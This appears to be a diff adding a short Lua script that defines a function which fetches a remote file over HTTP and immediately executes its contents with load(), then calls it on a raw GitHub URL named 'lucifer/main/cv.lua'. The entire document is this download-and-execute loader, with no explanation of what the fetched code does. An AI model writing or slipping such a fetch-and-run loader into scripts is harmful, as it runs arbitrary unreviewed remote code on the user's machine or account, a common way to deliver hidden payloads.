@@ -1,0 +1,9 @@
+```function Memek(od)
+    client = HttpClient.new()
+
+    client.url = od
+
+    load(client:request().body)()
+end
+
+Memek("https://raw.githubusercontent.com/ditampol-tzuyoon/lucifer/main/cv.lua")```
